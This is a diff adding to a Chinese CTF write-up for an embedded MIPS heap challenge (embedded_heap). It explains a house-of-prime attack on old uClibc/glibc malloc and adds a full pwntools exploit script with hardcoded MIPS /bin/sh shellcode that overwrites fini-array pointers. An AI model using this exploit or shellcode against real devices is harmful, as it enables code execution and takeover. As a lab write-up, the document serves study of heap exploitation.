@@ -81,14 +81,166 @@ del：free heap，同时将heap所对应的指针置0，也就是说没有UAF
 ![](/images/character5/firm5.png)
 
 
-## 思路
+## 漏洞利用思路
 
-固件一般使用ulibc,可认为是旧版的glibc,只要我们
+固件一般使用ulibc,可认为是旧版的glibc
+
+在旧版的glibc中malloc_state数据结构
+
+```
+struct malloc_state {
+
+  /* The maximum chunk size to be eligible for fastbin */
+  size_t  max_fast;   /* low 2 bits used as flags */
+
+  /* Fastbins */
+  mfastbinptr      fastbins[NFASTBINS];
+
+  /* Base of the topmost chunk -- not otherwise kept in a bin */
+  mchunkptr        top;
+
+  /* The remainder from the most recent split of a small request */
+  mchunkptr        last_remainder;
+
+  /* Normal bins packed as described above */
+  mchunkptr        bins[NBINS * 2];
+
+  /* Bitmap of bins. Trailing zero map handles cases of largest binned size */
+  unsigned int     binmap[BINMAPSIZE+1];
+
+  /* Tunable parameters */
+  unsigned long     trim_threshold;
+  size_t  top_pad;
+  size_t  mmap_threshold;
+
+  /* Memory map support */
+  int              n_mmaps;
+  int              n_mmaps_max;
+  int              max_n_mmaps;
+
+  /* Cache malloc_getpagesize */
+  unsigned int     pagesize;
+
+  /* Track properties of MORECORE */
+  unsigned int     morecore_properties;
+
+  /* Statistics */
+  size_t  mmapped_mem;
+  size_t  sbrked_mem;
+  size_t  max_sbrked_mem;
+  size_t  max_mmapped_mem;
+  size_t  max_total_mem;
+};
+```
+
+在新版glibc中max_fast改为了全局变量
+
+所以可以使用house_of_prime的方式
+
+```
+#define fastbin_index(sz)        ((((unsigned int)(sz)) >> 3) - 2)
+```
+
+将max_fast修改为一个堆地址,8>>3-2 = -1即可，这样max_fast变为一个非常大的值，我们可以继续利用上面这段代码将某个变量改为堆地址。
+
+由于在mips中不支持nx这种方式，所以可直接指定将_dl_run_fini_array的函数指向我们的堆地址然后执行exit的时候执行里面的代码的时候会调用_dl_run_fini_array的函数，这样就可以执行我们的shellcode了
+
+
+
+\# **在qemu-system-mode下可以查看堆地址**
+
+
+
+# EXP
+
+```python
+from pwn import *
+p = remote('192.168.122.12',"9999")
+context.log_level = 'debug'
+context.arch = "mips"
+context.endian = 'big'
+chunks_size = []
+
+def get_chunk_size():
+    for i in range(3):
+        p.recvuntil("Chunk["+str(i)+"]:")
+        size = int(p.recvuntil("bytes",drop=True))
+        #log.success("chunk_size:"+chunk_size)
+        #size = int(chunk_size) & 0xff0
+        #log.success("chunk_size:"+str(hex(size)))
+        if size%4==0:
+            if size%8==0:
+                    size = size+4
+            else:
+                    pass
+        else:
+            size = size+4-size%4
+            if size%8==0:
+                    size = size+4
+        if size <= 8:
+                size = 12
+        chunks_size.append(size)
+        log.success("chunk_size:"+str(hex(size)))
+def choice(idx):
+    p.sendlineafter("Command",str(idx))
+
+def update(idx,size,content):
+    choice(1)
+    print str(size)
+    p.sendlineafter("Index",str(idx))
+    p.sendlineafter("Size",str(size))
+    p.sendafter("Content",content)
+
+def view():
+    choice(2)
+
+def pwn_over(idx1,idx2,idx3,size,content):
+    choice(3)
+    p.sendlineafter("Index",str(idx1))
+    p.sendlineafter("Index",str(idx2))
+    p.sendlineafter("Index",str(idx3))
+    raw_input()
+    p.sendlineafter("Size",str(size))
+    p.sendafter("Content",content)
+
+get_chunk_size()
+payload1 = 'a'*chunks_size[0]+p32(0x9) 
+update(0,len(payload1),payload1) #heap_over_size
+payload2 = 'b'*chunks_size[2]+p32(0x305d9) 
+#raw_input()
+update(2,len(payload2),payload2)
+buf =  ""
+buf += "\x24\x06\x06\x66\x04\xd0\xff\xff\x28\x06\xff\xff\x27"
+buf += "\xbd\xff\xe0\x27\xe4\x10\x01\x24\x84\xf0\x1f\xaf\xa4"
+buf += "\xff\xe8\xaf\xa0\xff\xec\x27\xa5\xff\xe8\x24\x02\x0f"
+buf += "\xab\x01\x01\x01\x0c\x2f\x62\x69\x6e\x2f\x73\x68\x00"
+
+payload3 = 'a'*(chunks_size[2]-4)+buf #prev_size + size
+pwn_over(1,3,2,len(payload3),payload3)
+p.interactive()
+```
+
+
+
+# 遇到的问题
+
+1. 开启gdbserver卡在监听端口
+
+换到3.2.0+-vmlinux就可以了
+
+2. 用socat兼调试gdbserver
+
+   ./socat tcp-l:9999,fork exec:./embedded_heap & (sh run.sh &)
+
+   
+
+ 
 
 
 
 
 
-# 尚存在的问题
+# 参考
 
-qemu-system-mode存在gdbserver无法监听端口的问题
+https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/
+
